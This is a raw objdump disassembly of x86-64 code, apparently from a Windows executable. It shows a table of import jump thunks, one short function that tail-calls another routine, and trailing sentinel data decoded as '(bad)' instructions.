  40a0d8:	ff 25 12 44 0d 00    	jmp    *0xd4412(%rip)        # 0x4de4f0
  40a0de:	90                   	nop
  40a0df:	90                   	nop
  40a0e0:	ff 25 6a 44 0d 00    	jmp    *0xd446a(%rip)        # 0x4de550
  40a0e6:	90                   	nop
  40a0e7:	90                   	nop
  40a0e8:	ff 25 5a 44 0d 00    	jmp    *0xd445a(%rip)        # 0x4de548
  40a0ee:	90                   	nop
  40a0ef:	90                   	nop
  40a0f0:	ff 25 2a 44 0d 00    	jmp    *0xd442a(%rip)        # 0x4de520
  40a0f6:	90                   	nop
  40a0f7:	90                   	nop
  40a0f8:	ff 25 5a 44 0d 00    	jmp    *0xd445a(%rip)        # 0x4de558
  40a0fe:	90                   	nop
  40a0ff:	90                   	nop
  40a100:	ff 25 2a 44 0d 00    	jmp    *0xd442a(%rip)        # 0x4de530
  40a106:	90                   	nop
  40a107:	90                   	nop
  40a108:	ff 25 1a 44 0d 00    	jmp    *0xd441a(%rip)        # 0x4de528
  40a10e:	90                   	nop
  40a10f:	90                   	nop
  40a110:	ff 25 fa 43 0d 00    	jmp    *0xd43fa(%rip)        # 0x4de510
  40a116:	90                   	nop
  40a117:	90                   	nop
  40a118:	ff 25 1a 44 0d 00    	jmp    *0xd441a(%rip)        # 0x4de538
  40a11e:	90                   	nop
  40a11f:	90                   	nop
  40a120:	ff 25 c2 43 0d 00    	jmp    *0xd43c2(%rip)        # 0x4de4e8
  40a126:	90                   	nop
  40a127:	90                   	nop
  40a128:	ff 25 b2 43 0d 00    	jmp    *0xd43b2(%rip)        # 0x4de4e0
  40a12e:	90                   	nop
  40a12f:	90                   	nop
  40a130:	ff 25 ca 43 0d 00    	jmp    *0xd43ca(%rip)        # 0x4de500
  40a136:	90                   	nop
  40a137:	90                   	nop
  40a138:	ff 25 9a 43 0d 00    	jmp    *0xd439a(%rip)        # 0x4de4d8
  40a13e:	90                   	nop
  40a13f:	90                   	nop
  40a140:	ff 25 c2 43 0d 00    	jmp    *0xd43c2(%rip)        # 0x4de508
  40a146:	90                   	nop
  40a147:	90                   	nop
  40a148:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40a14f:	00 
  40a150:	ff 25 62 47 0d 00    	jmp    *0xd4762(%rip)        # 0x4de8b8
  40a156:	90                   	nop
  40a157:	90                   	nop
  40a158:	ff 25 52 47 0d 00    	jmp    *0xd4752(%rip)        # 0x4de8b0
  40a15e:	90                   	nop
  40a15f:	90                   	nop
  40a160:	ff 25 92 47 0d 00    	jmp    *0xd4792(%rip)        # 0x4de8f8
  40a166:	90                   	nop
  40a167:	90                   	nop
  40a168:	ff 25 0a 47 0d 00    	jmp    *0xd470a(%rip)        # 0x4de878
  40a16e:	90                   	nop
  40a16f:	90                   	nop
  40a170:	ff 25 2a 47 0d 00    	jmp    *0xd472a(%rip)        # 0x4de8a0
  40a176:	90                   	nop
  40a177:	90                   	nop
  40a178:	ff 25 62 47 0d 00    	jmp    *0xd4762(%rip)        # 0x4de8e0
  40a17e:	90                   	nop
  40a17f:	90                   	nop
  40a180:	ff 25 92 47 0d 00    	jmp    *0xd4792(%rip)        # 0x4de918
  40a186:	90                   	nop
  40a187:	90                   	nop
  40a188:	ff 25 fa 46 0d 00    	jmp    *0xd46fa(%rip)        # 0x4de888
  40a18e:	90                   	nop
  40a18f:	90                   	nop
  40a190:	ff 25 ca 46 0d 00    	jmp    *0xd46ca(%rip)        # 0x4de860
  40a196:	90                   	nop
  40a197:	90                   	nop
  40a198:	ff 25 2a 47 0d 00    	jmp    *0xd472a(%rip)        # 0x4de8c8
  40a19e:	90                   	nop
  40a19f:	90                   	nop
  40a1a0:	ff 25 42 47 0d 00    	jmp    *0xd4742(%rip)        # 0x4de8e8
  40a1a6:	90                   	nop
  40a1a7:	90                   	nop
  40a1a8:	ff 25 52 47 0d 00    	jmp    *0xd4752(%rip)        # 0x4de900
  40a1ae:	90                   	nop
  40a1af:	90                   	nop
  40a1b0:	ff 25 92 46 0d 00    	jmp    *0xd4692(%rip)        # 0x4de848
  40a1b6:	90                   	nop
  40a1b7:	90                   	nop
  40a1b8:	ff 25 da 46 0d 00    	jmp    *0xd46da(%rip)        # 0x4de898
  40a1be:	90                   	nop
  40a1bf:	90                   	nop
  40a1c0:	ff 25 ca 46 0d 00    	jmp    *0xd46ca(%rip)        # 0x4de890
  40a1c6:	90                   	nop
  40a1c7:	90                   	nop
  40a1c8:	ff 25 b2 46 0d 00    	jmp    *0xd46b2(%rip)        # 0x4de880
  40a1ce:	90                   	nop
  40a1cf:	90                   	nop
  40a1d0:	ff 25 92 46 0d 00    	jmp    *0xd4692(%rip)        # 0x4de868
  40a1d6:	90                   	nop
  40a1d7:	90                   	nop
  40a1d8:	ff 25 e2 46 0d 00    	jmp    *0xd46e2(%rip)        # 0x4de8c0
  40a1de:	90                   	nop
  40a1df:	90                   	nop
  40a1e0:	ff 25 ea 46 0d 00    	jmp    *0xd46ea(%rip)        # 0x4de8d0
  40a1e6:	90                   	nop
  40a1e7:	90                   	nop
  40a1e8:	ff 25 ea 46 0d 00    	jmp    *0xd46ea(%rip)        # 0x4de8d8
  40a1ee:	90                   	nop
  40a1ef:	90                   	nop
  40a1f0:	ff 25 fa 46 0d 00    	jmp    *0xd46fa(%rip)        # 0x4de8f0
  40a1f6:	90                   	nop
  40a1f7:	90                   	nop
  40a1f8:	ff 25 52 46 0d 00    	jmp    *0xd4652(%rip)        # 0x4de850
  40a1fe:	90                   	nop
  40a1ff:	90                   	nop
  40a200:	ff 25 3a 46 0d 00    	jmp    *0xd463a(%rip)        # 0x4de840
  40a206:	90                   	nop
  40a207:	90                   	nop
  40a208:	ff 25 4a 46 0d 00    	jmp    *0xd464a(%rip)        # 0x4de858
  40a20e:	90                   	nop
  40a20f:	90                   	nop
  40a210:	ff 25 f2 46 0d 00    	jmp    *0xd46f2(%rip)        # 0x4de908
  40a216:	90                   	nop
  40a217:	90                   	nop
  40a218:	ff 25 8a 46 0d 00    	jmp    *0xd468a(%rip)        # 0x4de8a8
  40a21e:	90                   	nop
  40a21f:	90                   	nop
  40a220:	ff 25 ea 46 0d 00    	jmp    *0xd46ea(%rip)        # 0x4de910
  40a226:	90                   	nop
  40a227:	90                   	nop
  40a228:	ff 25 42 46 0d 00    	jmp    *0xd4642(%rip)        # 0x4de870
  40a22e:	90                   	nop
  40a22f:	90                   	nop
  40a230:	ff 25 3a 44 0d 00    	jmp    *0xd443a(%rip)        # 0x4de670
  40a236:	90                   	nop
  40a237:	90                   	nop
  40a238:	ff 25 2a 44 0d 00    	jmp    *0xd442a(%rip)        # 0x4de668
  40a23e:	90                   	nop
  40a23f:	90                   	nop
  40a240:	ff 25 82 43 0d 00    	jmp    *0xd4382(%rip)        # 0x4de5c8
  40a246:	90                   	nop
  40a247:	90                   	nop
  40a248:	ff 25 82 43 0d 00    	jmp    *0xd4382(%rip)        # 0x4de5d0
  40a24e:	90                   	nop
  40a24f:	90                   	nop
  40a250:	ff 25 32 43 0d 00    	jmp    *0xd4332(%rip)        # 0x4de588
  40a256:	90                   	nop
  40a257:	90                   	nop
  40a258:	ff 25 da 43 0d 00    	jmp    *0xd43da(%rip)        # 0x4de638
  40a25e:	90                   	nop
  40a25f:	90                   	nop
  40a260:	ff 25 ca 43 0d 00    	jmp    *0xd43ca(%rip)        # 0x4de630
  40a266:	90                   	nop
  40a267:	90                   	nop
  40a268:	ff 25 42 43 0d 00    	jmp    *0xd4342(%rip)        # 0x4de5b0
  40a26e:	90                   	nop
  40a26f:	90                   	nop
  40a270:	ff 25 22 43 0d 00    	jmp    *0xd4322(%rip)        # 0x4de598
  40a276:	90                   	nop
  40a277:	90                   	nop
  40a278:	ff 25 5a 43 0d 00    	jmp    *0xd435a(%rip)        # 0x4de5d8
  40a27e:	90                   	nop
  40a27f:	90                   	nop
  40a280:	ff 25 3a 43 0d 00    	jmp    *0xd433a(%rip)        # 0x4de5c0
  40a286:	90                   	nop
  40a287:	90                   	nop
  40a288:	ff 25 9a 43 0d 00    	jmp    *0xd439a(%rip)        # 0x4de628
  40a28e:	90                   	nop
  40a28f:	90                   	nop
  40a290:	ff 25 aa 43 0d 00    	jmp    *0xd43aa(%rip)        # 0x4de640
  40a296:	90                   	nop
  40a297:	90                   	nop
  40a298:	ff 25 52 43 0d 00    	jmp    *0xd4352(%rip)        # 0x4de5f0
  40a29e:	90                   	nop
  40a29f:	90                   	nop
  40a2a0:	ff 25 12 43 0d 00    	jmp    *0xd4312(%rip)        # 0x4de5b8
  40a2a6:	90                   	nop
  40a2a7:	90                   	nop
  40a2a8:	ff 25 ba 42 0d 00    	jmp    *0xd42ba(%rip)        # 0x4de568
  40a2ae:	90                   	nop
  40a2af:	90                   	nop
  40a2b0:	ff 25 f2 42 0d 00    	jmp    *0xd42f2(%rip)        # 0x4de5a8
  40a2b6:	90                   	nop
  40a2b7:	90                   	nop
  40a2b8:	ff 25 52 43 0d 00    	jmp    *0xd4352(%rip)        # 0x4de610
  40a2be:	90                   	nop
  40a2bf:	90                   	nop
  40a2c0:	ff 25 82 43 0d 00    	jmp    *0xd4382(%rip)        # 0x4de648
  40a2c6:	90                   	nop
  40a2c7:	90                   	nop
  40a2c8:	ff 25 ca 43 0d 00    	jmp    *0xd43ca(%rip)        # 0x4de698
  40a2ce:	90                   	nop
  40a2cf:	90                   	nop
  40a2d0:	ff 25 ba 43 0d 00    	jmp    *0xd43ba(%rip)        # 0x4de690
  40a2d6:	90                   	nop
  40a2d7:	90                   	nop
  40a2d8:	ff 25 c2 42 0d 00    	jmp    *0xd42c2(%rip)        # 0x4de5a0
  40a2de:	90                   	nop
  40a2df:	90                   	nop
  40a2e0:	ff 25 32 43 0d 00    	jmp    *0xd4332(%rip)        # 0x4de618
  40a2e6:	90                   	nop
  40a2e7:	90                   	nop
  40a2e8:	ff 25 f2 42 0d 00    	jmp    *0xd42f2(%rip)        # 0x4de5e0
  40a2ee:	90                   	nop
  40a2ef:	90                   	nop
  40a2f0:	ff 25 9a 42 0d 00    	jmp    *0xd429a(%rip)        # 0x4de590
  40a2f6:	90                   	nop
  40a2f7:	90                   	nop
  40a2f8:	ff 25 ea 42 0d 00    	jmp    *0xd42ea(%rip)        # 0x4de5e8
  40a2fe:	90                   	nop
  40a2ff:	90                   	nop
  40a300:	ff 25 4a 43 0d 00    	jmp    *0xd434a(%rip)        # 0x4de650
  40a306:	90                   	nop
  40a307:	90                   	nop
  40a308:	ff 25 4a 43 0d 00    	jmp    *0xd434a(%rip)        # 0x4de658
  40a30e:	90                   	nop
  40a30f:	90                   	nop
  40a310:	ff 25 4a 43 0d 00    	jmp    *0xd434a(%rip)        # 0x4de660
  40a316:	90                   	nop
  40a317:	90                   	nop
  40a318:	ff 25 6a 43 0d 00    	jmp    *0xd436a(%rip)        # 0x4de688
  40a31e:	90                   	nop
  40a31f:	90                   	nop
  40a320:	ff 25 5a 42 0d 00    	jmp    *0xd425a(%rip)        # 0x4de580
  40a326:	90                   	nop
  40a327:	90                   	nop
  40a328:	ff 25 4a 43 0d 00    	jmp    *0xd434a(%rip)        # 0x4de678
  40a32e:	90                   	nop
  40a32f:	90                   	nop
  40a330:	ff 25 42 42 0d 00    	jmp    *0xd4242(%rip)        # 0x4de578
  40a336:	90                   	nop
  40a337:	90                   	nop
  40a338:	ff 25 42 43 0d 00    	jmp    *0xd4342(%rip)        # 0x4de680
  40a33e:	90                   	nop
  40a33f:	90                   	nop
  40a340:	ff 25 c2 42 0d 00    	jmp    *0xd42c2(%rip)        # 0x4de608
  40a346:	90                   	nop
  40a347:	90                   	nop
  40a348:	ff 25 22 42 0d 00    	jmp    *0xd4222(%rip)        # 0x4de570
  40a34e:	90                   	nop
  40a34f:	90                   	nop
  40a350:	ff 25 a2 42 0d 00    	jmp    *0xd42a2(%rip)        # 0x4de5f8
  40a356:	90                   	nop
  40a357:	90                   	nop
  40a358:	ff 25 42 43 0d 00    	jmp    *0xd4342(%rip)        # 0x4de6a0
  40a35e:	90                   	nop
  40a35f:	90                   	nop
  40a360:	ff 25 9a 42 0d 00    	jmp    *0xd429a(%rip)        # 0x4de600
  40a366:	90                   	nop
  40a367:	90                   	nop
  40a368:	ff 25 b2 42 0d 00    	jmp    *0xd42b2(%rip)        # 0x4de620
  40a36e:	90                   	nop
  40a36f:	90                   	nop
  40a370:	48 83 ec 28          	sub    $0x28,%rsp
  40a374:	e8 77 aa ff ff       	call   0x404df0
  40a379:	44 8b 0d 80 0c 00 00 	mov    0xc80(%rip),%r9d        # 0x40b000
  40a380:	4c 8b 05 49 30 0d 00 	mov    0xd3049(%rip),%r8        # 0x4dd3d0
  40a387:	31 d2                	xor    %edx,%edx
  40a389:	48 8b 0d 48 30 0d 00 	mov    0xd3048(%rip),%rcx        # 0x4dd3d8
  40a390:	48 83 c4 28          	add    $0x28,%rsp
  40a394:	e9 07 91 ff ff       	jmp    0x4034a0
  40a399:	90                   	nop
  40a39a:	90                   	nop
  40a39b:	90                   	nop
  40a39c:	90                   	nop
  40a39d:	90                   	nop
  40a39e:	90                   	nop
  40a39f:	90                   	nop
  40a3a0:	ff                   	(bad)
  40a3a1:	ff                   	(bad)
  40a3a2:	ff                   	(bad)
  40a3a3:	ff                   	(bad)
  40a3a4:	ff                   	(bad)
  40a3a5:	ff                   	(bad)
  40a3a6:	ff                   	(bad)
  40a3a7:	ff 00                	incl   (%rax)
  40a3a9:	00 00                	add    %al,(%rax)
  40a3ab:	00 00                	add    %al,(%rax)
  40a3ad:	00 00                	add    %al,(%rax)
  40a3af:	00 ff                	add    %bh,%bh
  40a3b1:	ff                   	(bad)
  40a3b2:	ff                   	(bad)
  40a3b3:	ff                   	(bad)
  40a3b4:	ff                   	(bad)
  40a3b5:	ff                   	(bad)
  40a3b6:	ff                   	(bad)
  40a3b7:	ff 00                	incl   (%rax)
  40a3b9:	00 00                	add    %al,(%rax)
  40a3bb:	00 00                	add    %al,(%rax)
  40a3bd:	00 00                	add    %al,(%rax)
	...
